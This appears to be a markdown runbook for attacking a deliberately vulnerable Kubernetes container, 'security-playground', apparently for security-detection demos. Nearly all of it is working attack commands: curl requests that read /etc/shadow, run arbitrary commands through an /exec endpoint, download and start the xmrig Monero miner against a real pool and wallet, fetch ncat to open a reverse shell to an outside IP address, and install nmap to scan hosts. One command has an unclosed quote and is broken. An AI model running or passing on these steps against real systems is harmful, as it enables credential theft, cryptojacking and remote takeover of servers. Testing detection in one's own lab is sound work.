# Prepare test workload
```
 kubectl create deployment playground --image=manuelbcd/security-playground:1.0.6
 kubectl expose deployment playground --port=80 --target-port=8080 --name=playground --type=LoadBalancer
```

# Configure local parameters
```
LOAD_BALANCER_URL=$(kubectl get svc playground -n default -o json | jq -r '.status.loadBalancer.ingress[].hostname')
PORT=80
echo "Target: $LOAD_BALANCER_URL:$PORT"
```

# Read the file /etc/shadow
```
curl $LOAD_BALANCER_URL:$PORT/etc/shadow
```

# Get a list of files
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=ls -la'
```

# Get my user (we are root)
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=uname -a'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=whoami'
```

# Istall cryptominer
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=wget -O file.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=tar -xvf file.tar.gz
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=sleep 1 && nohup ./xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero'
```

# Check that cryptominer is installed
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=ps -aux'
```

# Open reverse shell
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=chmod +x ncat'
sleep 1 && nohup curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=./ncat 34.77.63.85 34444 -e /bin/bash' &> /dev/null & nc -lnvp 34444
```

# Install nmap and scan hosts
```
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=apt-get update; apt-get -y install nmap'
curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=nmap -v scanme.nmap.org'
```





